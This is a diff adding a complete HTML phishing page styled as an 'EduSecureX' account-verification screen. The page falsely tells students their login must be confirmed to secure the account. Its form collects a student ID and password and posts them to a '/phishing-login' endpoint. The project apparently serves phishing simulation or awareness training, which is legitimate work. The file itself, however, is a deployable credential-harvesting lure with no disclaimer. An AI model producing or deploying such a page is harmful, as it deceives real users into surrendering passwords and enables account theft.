@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Account Verification | EduSecureX</title>
+    <style>
+       body {
+            /* High-tech blue background matching your dashboard screenshot */
+            background: linear-gradient(rgba(10, 24, 50, 0.9), rgba(30, 60, 114, 0.85)), 
+                        url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1920&q=80');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: white;
+        }
+
+        /* Glassmorphism box container */
+        .box {
+            width: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            padding: 45px;
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            text-align: center;
+        }
+
+        .secure-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+            display: inline-block;
+            filter: drop-shadow(0 0 10px rgba(255, 75, 43, 0.5));
+        }
+
+        h3 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 800;
+            color: #ffffff;
+        }
+
+        p {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-top: 15px;
+            border-radius: 10px;
+            border: none;
+            background: rgba(255, 255, 255, 0.95);
+            color: #333;
+            box-sizing: border-box;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: 3px solid #ff4b2b; /* Matching the brand's orange accent */
+            background: #ffffff;
+        }
+
+        /* The signature brand gradient button */
+        button {
+            width: 100%;
+            padding: 16px;
+            margin-top: 25px;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.3);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(255, 75, 43, 0.5);
+            filter: brightness(1.1);
+        }
+
+        .security-footer {
+            margin-top: 30px;
+            font-size: 10px;
+            color: #00d4ff; /* Tech cyan */
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h3>Account Verification Required</h3>
+    <p>
+        Please confirm your login credentials to secure your account.
+    </p>
+
+    <form method="POST" action="/phishing-login">
+        <input type="text" name="username" placeholder="Student ID" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Verify Account</button>
+    </form>
+</div>
+
+</body>
+</html>
